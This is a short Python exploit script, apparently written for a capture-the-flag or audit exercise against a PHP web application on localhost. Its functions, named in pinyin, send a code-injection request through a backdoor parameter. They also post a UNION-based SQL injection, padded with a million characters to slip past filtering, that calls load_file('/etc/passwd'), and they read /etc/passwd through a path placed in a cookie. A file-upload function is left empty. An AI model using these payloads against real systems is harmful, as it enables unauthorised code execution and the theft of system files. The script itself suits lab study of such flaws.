import requests

def zi_dai_hou_men():
	url = 'http://127.0.0.1:8080/doAction.php?id=phpinfo();'
	print(requests.get(url).text)
def sql_injection():
	url = "http://127.0.0.1:8080/search.php"
	data = {'key':"%'union/*"+'a'*1000000+"*/SELECT 1,2,load_file('/etc/passwd') #"}
	print(requests.post(url,data).text)
def wen_jian_du_qu():
	url = 'http://127.0.0.1:8080/admin/getCaptcha.php'
	header = {
	'Cookie':'Captcha=/etc/passwd'
	}
	print(requests.get(url=url,headers=header).text)
def wen_jian_shang_chuan():
	pass
#zi_dai_hou_men()
#sql_injection()
#wen_jian_du_qu()